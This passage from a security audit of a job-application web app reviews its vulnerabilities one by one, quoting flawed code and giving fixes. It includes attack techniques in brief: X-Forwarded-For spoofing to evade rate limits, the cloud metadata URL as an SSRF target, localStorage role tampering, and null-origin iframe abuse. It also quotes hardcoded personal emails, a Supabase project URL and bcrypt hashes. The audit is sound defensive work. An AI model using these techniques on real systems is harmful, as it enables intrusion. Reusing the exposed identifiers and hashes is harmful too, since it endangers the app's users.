    - Profile queries (`backend/db.js:596, 608`): `SELECT profile FROM userdata WHERE user_id = $1` and `INSERT INTO userdata ... ON CONFLICT (user_id) DO UPDATE SET profile = $2`.
    - Application tracker queries (`backend/db.js:630, 644`): `SELECT applications FROM userdata WHERE user_id = $1`.
    - User retrieval (`backend/db.js:345`): `SELECT * FROM users WHERE id = $1`.
- **3. Identified Risks & Vulnerabilities**:
  - **Vulnerability 5.1: Complete Absence of Database-Level RLS Policies**:
    - *Location*: `backend/db.js`, lines 20–74.
    - *Mechanics*: Table creation DDL statements omit `ALTER TABLE ... ENABLE ROW LEVEL SECURITY;`. No security policies (`CREATE POLICY ...`) exist in the database.
  - **Vulnerability 5.2: Public Supabase Anon Key Exposure with Missing RLS**:
    - *Location*: `frontend/auth.html:301–302`, `frontend/auth-callback.html:63–64`, and `backend/sync-server.js:603–604`:
      ```javascript
      const SUPABASE_URL = "https://fbyjrfrejgzcpqtdwudu.supabase.co";
      const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...";
      ```
    - *Impact*: In Supabase architectures, PostgREST exposes public REST endpoints (`/rest/v1/users`, `/rest/v1/userdata`) using the anon key. Without PostgreSQL RLS enabled, an attacker using the anon key can query, mutate, or dump all candidate records and user credentials directly via PostgREST, completely bypassing `backend/sync-server.js`.
- **4. Actionable Remediation Steps & Implementation Guidance**:
  1. Enable RLS on all PostgreSQL tables in Supabase:
     ```sql
     ALTER TABLE users ENABLE ROW LEVEL SECURITY;
     ALTER TABLE userdata ENABLE ROW LEVEL SECURITY;
     ALTER TABLE reports ENABLE ROW LEVEL SECURITY;
     ALTER TABLE telemetry ENABLE ROW LEVEL SECURITY;
     ```
  2. Revoke all public PostgREST permissions from the `anon` and `authenticated` roles if all client traffic is intended to transit through `backend/sync-server.js`:
     ```sql
     REVOKE ALL ON TABLE users, userdata, reports, telemetry FROM anon, authenticated;
     ```
  3. If PostgREST direct access is ever enabled for authenticated clients, implement granular user isolation policies:
     ```sql
     CREATE POLICY "Users can only access own userdata" ON userdata
       FOR ALL TO authenticated
       USING (auth.uid() = user_id)
       WITH CHECK (auth.uid() = user_id);
     ```

---

### Item 6: CSRF Protection
- **1. Audit Findings & Current Implementation Status**:
  - **Status**: `Implemented / Safe by Architecture`
  - The application is inherently protected against traditional Cross-Site Request Forgery (CSRF) attacks by virtue of its stateless token architecture.
  - Authentication relies strictly on custom HTTP headers (`Authorization: Bearer <token>`); no ambient session cookies (`Set-Cookie`) are used.
- **2. Existing Security Strengths (with Citations)**:
  - **Header-Based Authentication**:
    - `backend/sync-server.js:638–642`:
      ```javascript
      const authHeader = req.headers.authorization;
      if (authHeader && authHeader.startsWith("Bearer ")) {
        token = authHeader.substring(7).trim();
      }
      ```
    - Browsers do not automatically attach custom `Authorization` headers to cross-origin requests made via `<img>`, `<form>`, or cross-site `fetch` calls. Therefore, malicious third-party websites cannot trigger authenticated state-changing actions on behalf of a logged-in user.
  - **Strict Origin Filtering**:
    - `backend/sync-server.js:513–523`: Verifies the `Origin` header against an allowlist before returning permissive CORS response headers.
- **3. Identified Risks & Misconfigurations**:
  - **Absence of Anti-CSRF Infrastructure for Future Cookie Migration**: If the application transitions authentication tokens from `localStorage` to `httpOnly` cookies (as recommended in Item 13), CSRF protection will become mandatory. Currently, no anti-CSRF token generation (`X-CSRF-Token`, double-submit cookies) or `SameSite` cookie infrastructure exists.
- **4. Actionable Remediation Steps & Implementation Guidance**:
  1. When migrating authentication tokens to cookies (Item 13), configure `SameSite=Strict; Secure; HttpOnly`.
  2. Implement double-submit CSRF cookie protection or an `X-CSRF-Token` header validation middleware for all state-changing HTTP methods (`POST`, `PUT`, `DELETE`).

---

### Item 7: File Uploads
- **1. Audit Findings & Current Implementation Status**:
  - **Status**: `Partially Implemented / Architecture-Level Isolation`
  - The application avoids server-side upload vulnerabilities by not exposing multipart/binary upload endpoints on `backend/sync-server.js`.
  - Resume parsing, text extraction, and document processing are executed in-browser. However, client-side file type validation relies solely on HTML `accept` attributes without binary magic-byte inspection, and an administrative file overwrite route exists.
- **2. Existing Security Strengths (with Citations)**:
  - **Zero Server-Side Binary Upload Surface**: No multipart body parsers (`multer`, `formidable`, `busboy`) exist in `backend/package.json` or `backend/sync-server.js`.
  - **Client-Side Document Parsing**:
    - `frontend/ats-checker.html:974–996`: Resume PDF and Word documents are parsed locally in browser memory via `pdfjsLib.getDocument` and `mammoth.extractRawText`.
    - `frontend/gov-resizer.html:236–269`: Image resizing is handled locally via `FileReader` and HTML5 `canvas.toBlob()`.
  - **Decoupled Local IndexedDB Storage**:
    - `frontend/profile-setup.html:1385`: Document binary attachments are stored locally in IndexedDB (`CareerBridgeDocsDB.saveDocBinary`).
    - `frontend/shared-shell.js:528–542` (`sanitizeProfileForStorage`): Strips `.data` binary properties before network transmission, syncing only metadata (`name`, `size`, `type`, `storage: 'indexeddb'`).
- **3. Identified Risks & Misconfigurations**:
  - **Risk 7.1: Missing Magic-Byte / MIME Validation**:
    - Document selection relies entirely on HTML `<input type="file" accept=".pdf,.png,.jpg,.jpeg">`. Attackers can supply renamed malicious files (e.g. SVG files containing `<script>` tags, or polyglot files). If rendered in the browser, SVG files can execute inline JavaScript.
  - **Risk 7.2: Unrestricted File System Overwrite via Admin API**:
    - *Location*: `backend/sync-server.js`, lines 1785–1805:
      ```javascript
      if (req.method === "POST" && urlObj.pathname === "/api/admin/llms-config") {
        ...
        fs.writeFileSync(path.join(FRONTEND_DIR, "llms.txt"), llmsTxt, "utf8");
        fs.writeFileSync(path.join(FRONTEND_DIR, "llms-full.txt"), llmsFullTxt, "utf8");
      ```
    - *Mechanics*: Writes incoming string payloads directly to disk in the public frontend directory without file size limits, content validation, or sanitization.
- **4. Actionable Remediation Steps & Implementation Guidance**:
  1. Implement client-side binary signature (magic-byte) verification prior to processing files:
     ```javascript
     async function verifyMagicBytes(file) {
       const slice = await file.slice(0, 4).arrayBuffer();
       const bytes = new Uint8Array(slice);
       // PDF: %PDF (0x25 0x50 0x44 0x46)
       if (bytes[0] === 0x25 && bytes[1] === 0x50 && bytes[2] === 0x44 && bytes[3] === 0x46) return 'pdf';
       // PNG: 0x89 0x50 0x4E 0x47
       if (bytes[0] === 0x89 && bytes[1] === 0x50 && bytes[2] === 0x4E && bytes[3] === 0x47) return 'png';
       // JPEG: 0xFF 0xD8 0xFF
       if (bytes[0] === 0xFF && bytes[1] === 0xD8 && bytes[2] === 0xFF) return 'jpeg';
       throw new Error('Unsupported or forged file signature');
     }
     ```
  2. Explicitly reject `.svg` and `.html` file extensions to eliminate SVG-based stored XSS.
  3. Enforce maximum payload size limits (e.g., 50KB) and schema validation on `POST /api/admin/llms-config`.

---

### Item 8: SSRF Protection (Server-Side Request Forgery)
- **1. Audit Findings & Current Implementation Status**:
  - **Status**: `Partially Implemented`
  - Outbound HTTP requests from the backend are strictly limited to two specific integrations: Supabase OAuth token verification and the Adzuna job search proxy.
  - However, neither integration implements DNS pinning or internal IP address filtering (blacklisting `127.0.0.1`, `169.254.169.254`, and private RFC1918 ranges).
- **2. Existing Security Strengths (with Citations)**:
  - **Constrained Outbound Destinations**:
    - Supabase Auth Verification (`backend/sync-server.js:607–634`): The target URL is a fixed constant (`"https://fbyjrfrejgzcpqtdwudu.supabase.co/auth/v1/user"` at line 603). User input is only passed as the `Authorization: Bearer <token>` header value; host and path cannot be altered.
    - Adzuna Job Proxy (`backend/routes-jobs.js:27–66`): Target URL is constructed via template literal pointing strictly to `https://api.adzuna.com/v1/api/jobs/in/search/1`. User search parameters (`what`, `where`) are strictly sanitized via `encodeURIComponent()` (lines 30–31), preventing path traversal, host redirection, or protocol injection.
  - **Absence of Arbitrary URL Fetchers**: No user-supplied URL fetching, dynamic webhooks, or open proxies exist in the backend.
- **3. Identified Risks & Misconfigurations**:
  - **Lack of Egress Filtering & Private IP Blacklisting**: Outgoing requests do not validate the resolved IP address. In cloud environments (AWS, GCP, Azure), if future features fetch candidate portfolio links or company websites, unvalidated requests could reach the cloud metadata service (`http://169.254.169.254/latest/meta-data/`).
  - **Overly Broad `safeUrl` Regex in `frontend/tracker.html:100–114`**: The client regex `/^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}(\/.*)?$/` permits internal hostnames or IP-like hostnames.
- **4. Actionable Remediation Steps & Implementation Guidance**:
  1. Centralize all outbound HTTP requests through a hardened HTTP client wrapper that performs DNS resolution and verifies that destination IPs are public:
     ```javascript
     const dns = require("dns").promises;
     const ipaddr = require("ipaddr.js");

     async function validatePublicDestination(hostname) {
       const addresses = await dns.resolve4(hostname);
       for (const ip of addresses) {
         const parsed = ipaddr.parse(ip);
         if (["loopback", "private", "linkLocal", "uniqueLocal"].includes(parsed.range())) {
           throw new Error(`SSRF blocked: ${hostname} resolved to non-public IP ${ip}`);
         }
       }
     }
     ```
  2. Implement network firewall rules on backend containers restricting outbound TCP traffic exclusively to port 443 of verified provider domains (`api.adzuna.com`, `*.supabase.co`).

---

### Item 9: BOLA / IDOR (Broken Object Level Authorization)
- **1. Audit Findings & Current Implementation Status**:
  - **Status**: `Partially Implemented / Vulnerable in Admin Endpoints`
  - Candidate user endpoints are securely scoped to `activeUser.id` derived from JWT claims, preventing horizontal IDOR among standard users.
  - However, administrative endpoints suffer from critical authorization flaws: unconstrained impersonation token issuance and lack of existence validation in direct object mutation routes.
- **2. Existing Security Strengths (with Citations)**:
  - **Strict User Scoping on Public APIs**:
    - `backend/sync-server.js:1036`: Profile export binds strictly to `activeUser.id`.
    - `backend/sync-server.js:1061`: Account purge deletes only `activeUser.id`.
    - `backend/sync-server.js:1127`: Profile retrieval reads exclusively `activeUser.id`.
    - `backend/sync-server.js:1207`: Profile updates write only to `activeUser.id`.
    - `backend/sync-server.js:1231, 1253`: Tracker queries and syncs mutate only `activeUser.id`.
    Standard candidate endpoints do not accept a `userId` query parameter or body property, eliminating horizontal BOLA for candidates.
- **3. Identified Risks & Vulnerabilities**:
  - **Vulnerability 9.1: Unconstrained Admin Impersonation JWT Generation**:
    - *Location*: `backend/sync-server.js`, lines 1826–1854:
      ```javascript
      if (req.method === "POST" && /^\/api\/admin\/users\/[^/]+\/impersonate$/.test(urlObj.pathname)) {
        const targetUserId = urlObj.pathname.split("/")[4];
        const targetUser = await db.getUserById(targetUserId);
        ...
        const impersonateToken = jwt.sign({
          sub: targetUser.id,
          email: targetUser.email,
          name: targetUser.name,
          role: targetUser.role,
          impersonatedBy: activeUser ? activeUser.email : "admin"
        }, jwtSecret, { expiresIn: "1h" });
      ```
    - *Mechanics*: Any user with the `admin` role can generate a fully functional 1-hour JWT impersonating *any* user in the database without stepped-up authentication (MFA) or permission scoping. The token can be used to mutate or permanently delete target candidate data.
  - **Vulnerability 9.2: Direct Object Mutation in `PUT /api/admin/users/:id/profile` Without Existence Check**:
    - *Location*: `backend/sync-server.js`, lines 1872–1896:
      ```javascript
      if (req.method === "PUT" && /^\/api\/admin\/users\/[^/]+\/profile$/.test(urlObj.pathname)) {
        const targetUserId = urlObj.pathname.split("/")[4];
        ...
        if (incoming.profile) {
          await db.saveProfile(targetUserId, incoming.profile);
        }
      ```
    - *Mechanics*: The handler accepts `targetUserId` directly from the URL and invokes `db.saveProfile()` without checking whether `targetUserId` corresponds to an existing record in the `users` table. In file-storage mode, this creates arbitrary `{targetUserId}.json` files on disk.
- **4. Actionable Remediation Steps & Implementation Guidance**:
  1. Add record existence verification to `PUT /api/admin/users/:id/profile`:
     ```javascript
     const existingUser = await db.getUserById(targetUserId);
     if (!existingUser) {
       return sendJson(res, 404, { ok: false, error: "Target user not found" });
     }
     ```
  2. Scope impersonation tokens strictly to read-only access: add `"scope": "impersonation_read"` and reject any `POST`, `PUT`, or `DELETE` requests when an impersonation token is presented.
  3. Emit structured, tamper-evident audit logs to external storage whenever an impersonation token is issued or used.

---

### Item 10: Rate Limiting & Throttling
- **1. Audit Findings & Current Implementation Status**:
  - **Status**: `Partially Implemented / Vulnerable to IP Spoofing`
  - A sliding-window rate limiter is implemented with tiered limits for authentication, admin logins, telemetry, ATS scans, and document generation.
  - However, the rate limiter is **critically vulnerable to trivial IP spoofing** because client IP resolution blindly trusts the `X-Forwarded-For` header without checking `TRUST_PROXY`. Furthermore, all limiters reside in ephemeral process memory without Redis persistence.
- **2. Existing Security Strengths (with Citations)**:
  - **Sliding-Window Limiter Implementation**:
    - `backend/sync-server.js:525–538` (`isRateLimited`): Implements sliding-window timestamp tracking with periodic 10-minute garbage collection sweeps (`lines 338–366`).
  - **Granular Tiered Rate Limits**:
    - Global IP firewall: 120 requests/minute (`sync-server.js:794`).
    - Telemetry metrics: 30 requests/minute per IP (`sync-server.js:837`).
    - Anonymous ATS scan limits: 1 scan per 24 hours (`sync-server.js:877–880`) and 10 scans per 10 minutes (`sync-server.js:1928`).
    - Candidate auth endpoints: 10 requests/minute per IP (`sync-server.js:897`).
    - Dedicated admin login: 5 requests/minute per IP (`sync-server.js:928`).
    - Profile and tracker sync: 60 updates/hour per user (`sync-server.js:1166, 1238`).
    - Resume and cover letter generation: 5/hour for free users, 50/hour for paid users (`sync-server.js:2091–2098, 2326–2333`).
- **3. Identified Risks & Vulnerabilities**:
  - **Vulnerability 10.1: Complete Rate Limiter Bypass via `X-Forwarded-For` Spoofing (CRITICAL, SEC-10 Failure)**:
    - *Location*: `backend/sync-server.js`, lines 540–543:
      ```javascript
      function getClientIp(req) {
        const xfwd = req.headers["x-forwarded-for"];
        return (xfwd ? xfwd.split(",")[0].trim() : null) || req.socket.remoteAddress || "unknown-ip";
      }
      ```
    - *Mechanics*: `getClientIp` reads the first value from the client-supplied `X-Forwarded-For` header without validating `process.env.TRUST_PROXY === "true"` or checking if the request originated from a trusted upstream proxy.
    - *Impact*: An attacker can bypass all rate limits (including the 5 req/min admin login limit and the 10 req/min auth limit) by appending a random `X-Forwarded-For: 198.51.100.${n}` header to each request. This directly fails test `SEC-10` in `test/sec-verification.js:184–189`.
  - **Vulnerability 10.2: In-Memory Storage & Clustered Worker Weakness**:
    - *Location*: `backend/sync-server.js`, lines 331–336.
    - *Mechanics*: Limiters (`ipRateLimits`, `userRateLimits`, `loginFailures`) are stored in Node.js process memory (`Map`).
    - *Impact*: Every server restart or crash clears all rate limits and unlocks all locked accounts. In multi-worker or containerized deployments, each instance maintains an independent map, allowing attackers to multiply their request budget across instances.
- **4. Actionable Remediation Steps & Implementation Guidance**:
  1. Fix `getClientIp` to strictly honor `process.env.TRUST_PROXY`:
     ```javascript
     function getClientIp(req) {
       if (process.env.TRUST_PROXY === "true") {
         const xfwd = req.headers["x-forwarded-for"];
         if (xfwd) return xfwd.split(",")[0].trim();
       }
       return req.socket.remoteAddress || "unknown-ip";
     }
     ```
  2. Integrate Redis-backed distributed rate limiting (using `ioredis` and sliding-window sorted sets) for production multi-worker environments.
  3. Implement account-level and email-level throttling on registration and login, independent of client IP.

---

### Item 11: JWT Secrets & Session Cryptography
- **1. Audit Findings & Current Implementation Status**:
  - **Status**: `Partially Implemented / Vulnerable`
  - JWT tokens are signed using HMAC-SHA256 with a 64-byte secret loaded from `.env` (or a random 64-byte startup fallback).
  - However, token verification in `backend/auth-handler.js` and `backend/sync-server.js` omits algorithm pinning, creating algorithm confusion vulnerabilities. Furthermore, token revocation is purely in-memory and disconnected from API verification.
- **2. Existing Security Strengths (with Citations)**:
  - **Cryptographic Startup Fallback**: `backend/auth-handler.js:7–16`:
    ```javascript
    const _jwtSecretFromEnv = process.env.JWT_SECRET;
    const JWT_SECRET = _jwtSecretFromEnv || require("crypto").randomBytes(64).toString("hex");
    ```
    If `JWT_SECRET` is unset, it generates a cryptographically secure 64-byte random hex string.
  - **Explicit Expiration Configured**: Candidate user tokens expire in 7 days (`expiresIn: "7d"` at lines 70, 108); administrative tokens expire in 12 hours (`expiresIn: "12h"` at line 158).
  - **Production Secret Configuration**: `backend/.env` line 4 configures a high-entropy 128-hex-character secret.
- **3. Identified Risks & Vulnerabilities**:
  - **Vulnerability 11.1: Missing Algorithm Pinning in `jwt.verify` (Algorithm Confusion Hazard)**:
    - *Location*: `backend/auth-handler.js:256` and `backend/sync-server.js:653`:
      ```javascript
      jwt.verify(token, JWT_SECRET); // auth-handler.js:256
      jwt.verify(token, jwtSecret);  // sync-server.js:653
      ```
    - *Mechanics*: Neither call passes `{ algorithms: ["HS256"] }`. In architectures where asymmetric tokens (RS256 from Supabase) and symmetric tokens (HS256) interact, omitting `algorithms` permits header manipulation where an attacker could sign a forged token using the public RSA key as the HMAC secret.
  - **Vulnerability 11.2: Multi-Secret Collapsing**:
    - *Location*: `backend/sync-server.js`, line 652:
      ```javascript
      const jwtSecret = process.env.SUPABASE_JWT_SECRET || process.env.JWT_SECRET || auth.JWT_SECRET;
      ```
    - *Mechanics*: Blurs the boundary between external Supabase OAuth tokens and internal application tokens.
  - **Vulnerability 11.3: In-Memory Revocation Cache Disconnected from API Verification**:
    - *Location*: `backend/auth-handler.js:230` (`const revokedTokens = new Set()`) vs `backend/sync-server.js:653`.
    - *Mechanics*: `sync-server.js` never evaluates `auth.isTokenRevoked(token)` when verifying incoming bearer tokens.
- **4. Actionable Remediation Steps & Implementation Guidance**:
  1. Pin the algorithm explicitly in all `jwt.verify` calls:
     ```javascript
     jwt.verify(token, JWT_SECRET, { algorithms: ["HS256"] });
     ```
  2. Add startup validation in `auth-handler.js` to reject placeholder secrets (e.g. `replace_with_a_secure_random_64_character_hex_secret`) and secrets shorter than 32 bytes.
  3. Shorten access token lifetime to 15 minutes, paired with rotating refresh tokens stored in `httpOnly` cookies.

---

### Item 12: API Keys & Secrets Management
- **1. Audit Findings & Current Implementation Status**:
  - **Status**: `Partially Implemented / Vulnerable`
  - Third-party Adzuna credentials and PostgreSQL database connection strings are properly externalized into environment variables with safe defaults.
  - However, the Supabase project URL and anonymous API key are hardcoded into frontend and backend source files, and personal developer email addresses are hardcoded into server and client authorization logic.
- **2. Existing Security Strengths (with Citations)**:
  - **Adzuna API Credentials Externalization**: `backend/routes-jobs.js:73–74`:
    ```javascript
    const appId = process.env.ADZUNA_APP_ID;
    const appKey = process.env.ADZUNA_APP_KEY;
    ```
    If undefined, the application safely degrades to local mock job data (`jobs-db.json`) without failing.
  - **Database Connection String**: `backend/db.js:104` loads `process.env.DATABASE_URL` dynamically; `.env` is properly excluded via `.gitignore`.
- **3. Identified Risks & Vulnerabilities**:
  - **Vulnerability 12.1: Hardcoded Supabase Project URL and Anon API Key**:
    - *Location*: `backend/sync-server.js:603–604`, `frontend/auth.html:301–302`, `frontend/auth-callback.html:63–64`:
      ```javascript
      const SUPABASE_URL = "https://fbyjrfrejgzcpqtdwudu.supabase.co";
      const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...";
      ```
    - *Mechanics*: Committed string constants expose the project's Supabase backend to anyone inspecting repository source code or client HTML.
  - **Vulnerability 12.2: Hardcoded Personal Developer Email Addresses**:
    - *Location*: `backend/sync-server.js:644–648` and `frontend/admin/admin-shell.js:105, 119`:
      ```javascript
      var hardcodedAdmins = ["hidhanush07@gmail.com", "dhanushsiddilingam@gmail.com", "admin@jobxapply.app"];
      ```
    - *Mechanics*: Hardcoded identities bypass external secrets management and hardwire administrative authorization into source files.
- **4. Actionable Remediation Steps & Implementation Guidance**:
  1. Purge hardcoded email addresses from `backend/sync-server.js` and `frontend/admin/admin-shell.js`. Read strictly from `process.env.ADMIN_EMAILS`.
  2. Inject `SUPABASE_URL` and `SUPABASE_ANON_KEY` dynamically into frontend HTML via server-side templating or build-time environment variable substitution.

---

### Item 13: Token Storage & Client-Side Credential Lifecycle
- **1. Audit Findings & Current Implementation Status**:
  - **Status**: `Vulnerable (Critical Architectural Flaw)`
  - The application completely avoids cookies (`Set-Cookie` is never issued). Instead, all authentication tokens, roles, and plaintext master passcodes are stored in browser `localStorage`.
  - Credentials are broad-cast across the DOM via `window.dispatchEvent`, and client-side UI guards can be bypassed by editing `localStorage`.
- **2. Existing Security Strengths (with Citations)**:
  - **Cross-Tab Synchronization & BFCache Invalidation**:
    - `frontend/shared-shell.js:1462–1484`: Listens for `pageshow` and `storage` events to synchronize authentication state across browser tabs and prevent stale sessions upon backward/forward navigation.
- **3. Identified Risks & Vulnerabilities**:
  - **Vulnerability 13.1: Absolute Absence of `httpOnly` Cookies**:
    - *Location*: Entire codebase. `frontend/privacy-terms.html:345–348` explicitly confirms: *"We do not use cookies for tracking or session management; authentication tokens are stored locally in your browser's localStorage."*
    - *Mechanics*: Storing JWTs in `localStorage` makes them directly readable by any JavaScript running in the origin context. Any DOM XSS vulnerability allows an attacker to exfiltrate session tokens.
  - **Vulnerability 13.2: Plaintext Master Passcode Persisted in `localStorage`**:
    - *Location*: `frontend/shared-shell.js`, lines 471 and 1629:
      ```javascript
      localStorage.setItem('jxa_passcode', passcode);
      ```
    - *Mechanics*: The user's encryption passcode is stored in unencrypted web storage.
  - **Vulnerability 13.3: Credential Broadcasting via DOM Custom Events**:
    - *Location*: `frontend/shared-shell.js:312–318` and `frontend/auth-callback.html:103–109`:
      ```javascript
      window.dispatchEvent(new CustomEvent('jobxapply:shareAuth', {
        detail: {
          token: token,
          email: localStorage.getItem('jxa_user_email') || '',
          passcode: localStorage.getItem('jxa_passcode') || ''
        }
      }));
      ```
    - *Mechanics*: Any third-party script, analytics tag, or browser extension running in the page can listen to `window.addEventListener('jobxapply:shareAuth', ...)` and intercept the user's token, email, and master passcode in plaintext.
  - **Vulnerability 13.4: Client-Side Role Tampering Bypasses Admin UI Guard**:
    - *Location*: `frontend/admin/admin-shell.js`, lines 130–134:
      ```javascript
      if (storedRole === 'admin' || isOwnerEmail) {
        localStorage.setItem("jxa_role", "admin");
        if (typeof onSuccess === "function") onSuccess();
      }
      ```
    - *Mechanics*: Manually executing `localStorage.setItem('jxa_role', 'admin')` in the browser console allows any user to access the administrative dashboard UI (though backend API requests will fail if the JWT is not an admin token).
- **4. Actionable Remediation Steps & Implementation Guidance**:
  1. Migrate session tokens to `HttpOnly`, `Secure`, `SameSite=Strict` cookies issued by the backend:
     ```javascript
     res.setHeader("Set-Cookie", `jxa_token=${token}; HttpOnly; Secure; SameSite=Strict; Path=/api; Max-Age=43200`);
     ```
  2. Purge `localStorage.removeItem('jxa_token')`, `localStorage.removeItem('jxa_role')`, and `localStorage.removeItem('jxa_passcode')`.
  3. Remove `window.dispatchEvent(new CustomEvent('jobxapply:shareAuth', ...))`. Use `chrome.runtime.sendMessage` with origin validation for extension synchronization.

---

### Item 14: Default Credentials & Initial Deployment Security
- **1. Audit Findings & Current Implementation Status**:
  - **Status**: `Partially Implemented / Vulnerable`
  - Database seeding is guarded by `process.env.SEED_DEFAULT_USERS === "true"`, and seeded accounts utilize bcrypt hashes.
  - However, hardcoded bcrypt hashes for default candidate and admin accounts are committed in source code, default admin credentials appear in `.env.example` and UI placeholders, and a real candidate PII file is committed in version control.
- **2. Existing Security Strengths (with Citations)**:
  - **Seeding Guarded by Environment Flag**:
    - `backend/db.js:76–101`: Seeding is only triggered if `process.env.SEED_DEFAULT_USERS === "true"`. If unset or false, default accounts are not created.
- **3. Identified Risks & Vulnerabilities**:
  - **Vulnerability 14.1: Hardcoded Bcrypt Hashes in Source Code**:
    - *Location*: `backend/db.js`, lines 78–79:
      - Candidate hash: `$2b$10$.e2vkzVHk2KP.yzsmc4QEuMZaNqW7gzu/gNNxCVbJfJrHEDPUj6aq` (`candidate@jobxapply.app`)
      - Admin hash: `$2b$10$T8Z65cO6n/H.0CFp0jd6vewWcFD2sjmyznwxE7LFiEkLn9fKwP84O` (`admin@jobxapply.app`)
    - *Mechanics*: Publicly known password hashes allow offline rainbow table or brute-force attacks to recover default passwords.
  - **Vulnerability 14.2: Default Admin Identifier in Public UI and Examples**:
    - *Location*: `frontend/admin/login.html:178` and `backend/.env.example:17`:
      `placeholder="admin@jobxapply.app"` exposes default administrative identities.
  - **Vulnerability 14.3: Committed Candidate PII JSON File in Git (SEC-02 Failure)**:
    - *Location*: `database/users/u_mybckav7h6.json`.
    - *Mechanics*: A live candidate data file containing profile and application details is committed in the repository, failing automated test `SEC-02` in `test/sec-verification.js:69–74`.
- **4. Actionable Remediation Steps & Implementation Guidance**:
  1. Remove hardcoded bcrypt hashes from `backend/db.js`. If seeding is enabled, hash passwords at runtime from environment variables (`SEED_ADMIN_PASSWORD`).
  2. Delete `database/users/u_mybckav7h6.json` from git tracking and ensure `database/users/*.json` remains strictly ignored via `.gitignore` (retaining only `.gitkeep`).
  3. Change placeholder text in `frontend/admin/login.html` to generic text (`placeholder="admin@yourdomain.com"`).

---

### Item 15: CORS Policy (Cross-Origin Resource Sharing)
- **1. Audit Findings & Current Implementation Status**:
  - **Status**: `Partially Implemented / Vulnerable`
  - Origin allowlist validation is implemented in `backend/sync-server.js` with dynamic `Access-Control-Allow-Origin` assignment and `Vary: Origin` caching headers.
  - However, the allowlist includes a dangerous wildcard extension origin, rejects fail-safes by reflecting `"null"` with credentials enabled, and the allowed HTTP methods omit `PUT`.
- **2. Existing Security Strengths (with Citations)**:
  - **Allowlist Origin Validation**: `backend/sync-server.js:513–523` (`isAllowedOrigin`) validates incoming `Origin` headers before generating CORS responses.
  - **Dynamic Origin Header Reflection**: `backend/sync-server.js:587–601` (`writeCorsHeaders`) reflects only the validated origin rather than a global `*` wildcard when credentials are exchanged.
  - **Cache Isolation**: Sets `res.setHeader("Vary", "Origin")` (line 600) to prevent CDN cache poisoning.
- **3. Identified Risks & Vulnerabilities**:
  - **Vulnerability 15.1: Wildcard Chrome Extension Origin in Static Allowlist (CRITICAL, SEC-07 Failure)**:
    - *Location*: `backend/sync-server.js`, lines 508 and 517–519:
      ```javascript
      const ALLOWED_ORIGINS = new Set([
        ...
        "chrome-extension://",
      ]);
      ```
      And lines 517–519:
      ```javascript
      const verifiedExtensionId = process.env.ALLOWED_EXTENSION_ID || "";
      if (verifiedExtensionId && origin === ("chrome-extension://" + verifiedExtensionId)) return true;
      if (origin === "chrome-extension://" || origin === "moz-extension://jobxapply_autofill@jobxapply.local") return true;
      ```
    - *Mechanics*: The static set includes `"chrome-extension://"`, and the code checks `ALLOWED_EXTENSION_ID` (singular) rather than `ALLOWED_EXTENSION_IDS` (plural list documented in `.env.example`). This fails test `SEC-07` in `test/sec-verification.js:143–151`.
  - **Vulnerability 15.2: Insecure "null" Origin Reflection with Credentials Allowed**:
    - *Location*: `backend/sync-server.js`, line 596 and lines 742–747:
      ```javascript
      // In writeCorsHeaders:
      else { res.setHeader("Access-Control-Allow-Origin", "null"); }
      // In sendJson:
      if (currentOrigin) {
        headers["Access-Control-Allow-Origin"] = currentOrigin; // "null"
        headers["Access-Control-Allow-Credentials"] = "true";
      }
      ```
    - *Impact*: An attacker hosting a sandboxed iframe (`<iframe sandbox="allow-scripts allow-forms">`) triggers requests with `Origin: null`. The server reflects `"null"` and allows credentials, creating a credentialed cross-origin data leakage vector.
  - **Vulnerability 15.3: Missing `PUT` in Allowed Methods**:
    - *Location*: `backend/sync-server.js`, line 598:
      ```javascript
      res.setHeader("Access-Control-Allow-Methods", "GET,POST,DELETE,OPTIONS");
      ```
    - *Mechanics*: Omission of `PUT` breaks browser preflight requests for `PUT /api/admin/users/:id/profile`.
- **4. Actionable Remediation Steps & Implementation Guidance**:
  1. Remove `"chrome-extension://"` from the static `ALLOWED_ORIGINS` Set in `sync-server.js:508`.
  2. Support comma-separated `ALLOWED_EXTENSION_IDS`:
     ```javascript
     const allowedExtIds = new Set((process.env.ALLOWED_EXTENSION_IDS || "")
       .split(",")
       .map(id => id.trim())
       .filter(Boolean));
     if (origin && origin.startsWith("chrome-extension://")) {
       const extId = origin.replace("chrome-extension://", "").split("/")[0];
       if (allowedExtIds.has(extId)) return true;
     }
     ```
  3. When an origin is rejected, omit `Access-Control-Allow-Origin` entirely. Never return `"null"` and never return `Access-Control-Allow-Credentials: "true"` on unauthenticated origins.
  4. Update `Access-Control-Allow-Methods` to `"GET,POST,PUT,DELETE,OPTIONS"`.

---

### Item 16: Webhook Signatures
- **1. Audit Findings & Current Implementation Status**:
  - **Status**: `Not Implemented / Not Applicable`
  - The CareerBridge codebase currently contains zero inbound webhook endpoints (e.g. no Stripe, GitHub, or PayPal webhook handlers).
  - The term "webhook" appears only in `extension/mock-profile-data.js:180` as static mock text.
- **2. Existing Security Strengths (with Citations)**:
  - Zero attack surface: Because no webhook listeners exist, no webhook spoofing or replay vulnerabilities currently affect the backend.
- **3. Identified Risks & Misconfigurations**:
  - Future Integration Hazard: If payment processing (e.g. Stripe checkout for subscription tiers) or OAuth webhooks are introduced, failure to verify HMAC signatures using constant-time comparison will introduce critical vulnerabilities.
- **4. Actionable Remediation Steps & Implementation Guidance**:
  - When webhook endpoints are developed:
    1. Capture the raw unparsed request body (`Buffer`) before JSON parsing.
    2. Compute expected HMAC: `crypto.createHmac("sha256", WEBHOOK_SECRET).update(rawBody).digest("hex")`.
    3. Verify signatures using `crypto.timingSafeEqual(Buffer.from(signatureHeader), Buffer.from(expectedSignature))`.
    4. Validate timestamps (`Math.abs(Date.now() - timestamp) < 300000`) to prevent replay attacks.

---

### Item 17: Source Maps & Build Configuration
- **1. Audit Findings & Current Implementation Status**:
  - **Status**: `Not Applicable / Implemented`
  - The application uses a static, unbundled architecture with no Webpack, Vite, or TypeScript compilation step (`package.json:12` and `netlify.toml:3`).
  - No application source map files (`.map`) exist, and no `sourceMappingURL` comments are served.
- **2. Existing Security Strengths (with Citations)**:
  - **Zero Source Map Leakage**: No `.map` files are generated or exposed in `frontend/`, `backend/`, or `extension/`.
- **3. Identified Risks & Misconfigurations**:
